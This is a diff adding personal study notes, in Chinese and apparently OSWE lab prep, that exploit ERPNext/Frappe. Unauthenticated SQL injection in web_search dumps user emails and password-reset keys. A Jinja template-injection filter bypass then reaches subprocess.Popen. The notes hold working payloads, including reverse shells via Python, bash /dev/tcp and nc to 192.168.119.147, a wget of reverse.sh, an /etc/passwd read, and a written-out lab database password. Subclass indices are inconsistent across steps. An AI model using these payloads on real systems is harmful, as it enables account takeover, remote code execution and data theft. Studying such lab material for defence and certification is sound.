@@ -1,0 +1,193 @@
+ssh frappe@192.168.147.123
+1.修改mysql配置啟用log模式
+sudo nano /etc/mysql/my.cnf
+sudo tail -f /var/log/mysql/mysql.log
+sudo systemctl restart mysql
+2.啟動frappe服務
+cd /home/frappe/frappe-bench/
+bench start
+2.請求frappe/的時候請求會找到apps/frappe/frappe/__init__.py
+3.在登入頁面抓取請求可以看到post請求
+###正常請求後面sql長這樣
+cmd=frappe.website.doctype.website_settings.website_settings.is_chat_enabled
+15 Connect   _1bd3e0294da19198@localhost as anonymous on
+15 Query     SET AUTOCOMMIT = 0
+15 Init DB   _1bd3e0294da19198
+15 Query     select `user_type`, `first_name`, `last_name`, `user_image` from `tabUser` where `name` = 'Guest' order by modified desc
+15 Query     select `value` from
+     `tabSingles` where `doctype`='Website Settings' and `field`='chat_enable'
+15 Query     rollback
+15 Query     START TRANSACTION
+15 Quit
+4.這時候的請求會走到這隻腳本內的is_chat_enabled方法,因為這方法有套用這個裝飾器@frappe.whitelist(allow_guest=True),該裝飾器允許未認證用戶請求
+apps/frappe/frappe/website/doctype/website_settings/website_settings.py
+5.根據這個裝飾器查找套用的方法@frappe.whitelist(allow_guest=True),可以找到該發訪def web_search(text, scope=None, start=0, limit=20):
+/Users/timmy/timmy/OSWE/oswe/ERPNext/frappe-bench/apps/frappe/frappe/utils/global_search.py
+6.web_search這個方法的四個參數其中text會迴圈帶入以及會用frappe.db.escapes內建的方訪過濾參數
+text, scope=None, start=0, limit=20
+7.調整請求路徑去執行web_search的方法加入&text=offsec
+cmd=frappe.utils.global_search.web_search&text=offsec
+101 Connect   _1bd3e0294da19198@localhost as anonymous on
+101 Query     SET AUTOCOMMIT = 0
+101 Init DB   _1bd3e0294da19198
+101 Query     select `user_type`, `first_name`, `last_name`, `user_image` from `tabUser` where `name` = 'Guest' order by modified desc
+101 Query     SELECT `doctype`, `name`, `content`, `title`, `route`
+      FROM `__global_search`
+      WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
+      LIMIT 20 OFFSET 0
+101 Query     rollback
+101 Query     START TRANSACTION
+101 Quit
+7.調整請求路徑去執行web_search的方法加入&text=offsec&scope=offsec_scope
+
+210925 13:21:25   131 Connect   _1bd3e0294da19198@localhost as anonymous on
+                  131 Query     SET AUTOCOMMIT = 0
+                  131 Init DB   _1bd3e0294da19198
+                  131 Query     select `user_type`, `first_name`, `last_name`, `user_image` from `tabUser` where `name` = 'Guest' order by modified desc
+                  131 Query     SELECT `doctype`, `name`, `content`, `title`, `route`
+                        FROM `__global_search`
+                        WHERE `published` = 1 AND  `route` like "offsec_scope%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
+                        LIMIT 20 OFFSET 0
+                  131 Query     rollback
+                  131 Query     START TRANSACTION
+                  131 Quit
+
+7.調整請求路徑去執行web_search的方法加入&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,5#
+先加一個"中斷語句之後,UNION ALL SELECT 前面五個欄位
+cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,5#
+8.這時候確定有SQL Injection了,嘗試取出版本號
+cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,@@version#
+9.使用忘記密碼輸入token_searchForUserTable@mail.com,在mysql日誌中可以看到以下內容,查找到有 tabUser的表
+251 Connect   _1bd3e0294da19198@localhost as anonymous on
+251 Query     SET AUTOCOMMIT = 0
+251 Init DB   _1bd3e0294da19198
+251 Query     select `user_type`, `first_name`, `last_name`, `user_image` from `tabUser` where `name` = 'Guest' order by modified desc
+251 Query     select * from `tabUser` where `name` = 'token_searchForUserTable@mail.com' order by modified desc
+251 Query     rollback
+251 Query     START TRANSACTION
+251 Quit
+10.根據documentation可以發現email地址會存放在__Auth,嘗試查找email
+SELECT name FROM __Auth;
+11.根據配置文件可以找到db訊息
+/Users/timmy/timmy/OSWE/oswe/ERPNext/frappe-bench/sites/site1.local/site_config.json
+可以找到mysql帳號密碼
+root frappe猜的
+_1bd3e0294da19198 32ldabYvxQanK4jj
+11.替換SQL取得email地址
+cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,name FROM __Auth#
+發現有錯誤報錯返回Illegal mix of collations for operation 'UNION'\\\")\\n\"]"}
+
+进过检查，原来是字段排序编码不同导致的问题:
+相同字段的编码为
+utf8_general_ci 与 utf8_unicode_ci ，就会报Illegal mix of collations for operation “UNION”的错误。
+實際SQL長這樣
+SELECT `doctype`, `name`, `content`, `title`, `route`
+ FROM `__global_search`
+  WHERE `published` = 1
+  AND  `route` like "offsec_scope"UNION SELECT 1,2,3,4, name FROM __Auth
+  #%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE) LIMIT 20 OFFSET 0;
+12.所以先要查出__global_search這表內的name欄位的排序編碼
+select COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"
+12.
+offsec_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#
+13.查出欄位名稱是utf8mb4_general_ci
+cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#
+14.指定COLLATION_NAME的編碼後可以正常查詢
+SELECT name COLLATE utf8mb4_general_ci FROM __Auth;
+cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
+15.查詢到name欄位後有兩條帳號,前端使用zeljka.k@randomdomain.com帳號忘記密碼功能,讓系統發送重置密碼件
+Administrator
+zeljka.k@randomdomain.com
+16.使用以下語句取出tabUser表所有欄位
+SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser";
+cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#
+17.根據取出的欄位名稱,可以找到重置密碼的欄位為reset_password_key
+18.數據庫中須取出指令select name, reset_password_key from tabUser;
+19.替換成SQL Injection
+cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT reset_password_key COLLATE utf8mb4_general_ci ,2,3,4,name COLLATE utf8mb4_general_ci FROM tabUser#
+20.查找到name及reset_password_key後根據關鍵字reset_password_key在路徑裡面搜,可以找到apps/frappe/frappe/core/doctype/user/user.py
+21.找到重置密碼的連接如下
+url = "/update-password?key=" + key
+
+
+22.ERPNext使用者是jinja模板
+23.jinja模板的語法有如下兩種可以執行指令
+这里有两种分隔符: {% ... %} 和 {{ ... }},前者用于执行诸如 for 循环 或赋值的语句，后者把表达式的结果打印到模板上。
+24.我們可以直接在email.template上建立一個{{7*7}}的email模板,在mail時使用該模板可以執行計算
+25.在template中加入{{''.__class__}}當模板測試後,會返回Illegal template,在burp中可以看到詳細報錯是在這隻腳本的22行的render_template方法報錯
+home/frappe/frappe-bench/apps/frappe/frappe/email/doctype/email_template/email_template.py
+26.根據render_template方法名稱在資料夾搜索def render_template( 可以找到這方法是定義在
+ERPNext/frappe-bench/apps/frappe/frappe/utils/jinja.py
+27.在這render_template方法中有過濾.__的字段
+28.使用以下語句來逃避.__
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+{{string|attr(class)}}
+29.根據上述語句可以取出確認<class 'str'>,在burp裡面可以看到返回
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+{{string|attr(class)|attr(mro)}}
+30.根據上述可以確認class及mro的狀態
+(<class 'str'>, <class 'object'>)
+31.嘗試接觸mro[1],會出現got '['報錯
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+{{string|attr(class)|attr(mro)[1]}}
+32.改嘗試以下,先將mro弄成變量,再從變量取出,如上報錯是{%%}內無法使用[]
+{% set mro_r = string|attr(class)|attr(mro) %}
+{{ mro_r[1] }}
+33.嘗試之後可以找到mro_r[1]是一個object
+(<class 'str'>, <class 'object'>)</div><div></div><div><class 'object'>
+34.將mro_r[1]的方法list全部打印出來
+{% set mro_r = string|attr(class)|attr(mro) %}
+{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+{{ subclasses_r }}
+35.差找到list中336個方法是subprocess.Popen,該方法可以執行指令
+36.使用{{ subclasses_r[336] }}打印出class確定是<class 'subprocess.Popen'>
+37.使用指令測試創建文件
+{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
+38.測試可以後面帶參數進去
+{{ subclasses_r[1212](["/usr/bin/bash","/tmp/987","/tmp/789"]) }}
+
+{{ subclasses_r[1212](["/usr/bin/wget","http://192.168.119.147/reverse.sh"]) }}
+{{ subclasses_r[1212](["/usr/bin/touch","666"]) }}
+python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.119.147",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
+
+{{ subclasses_r[1212](["/usr/bin/wget","192.168.119.147/reverse.sh",""]) }}
+wget 192.168.119.147/reverse.sh -o /tmp/rever
+
+wget http://192.168.119.147/reverse.sh
+
+
+38.取得reverse shell
+{{ subclasses_r[336](["/usr/bin/touch","/tmp/987","/tmp/789"]) }}
+
+/bin/bash -i >& /dev/tcp/192.168.119.147/4444 0>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.147 4242 >/tmp/f
+
+
+
+###python3內建函數繼承的內容找到第40個是mappingproxy
+###python2內建函數繼承的內容找到第40個是file,以下在python2可以直接查看檔案
+print (''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read())
+''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
+
+###jinja的核心也是python
+###jinjia的|相當於python的print
+
+
+
+
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+{% set mro_r = string|attr(class)|attr(mro) %}
+{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+{{ subclasses_r[1212]([“/usr/bin/touch","/tmp/987","/tmp/789"]) }}
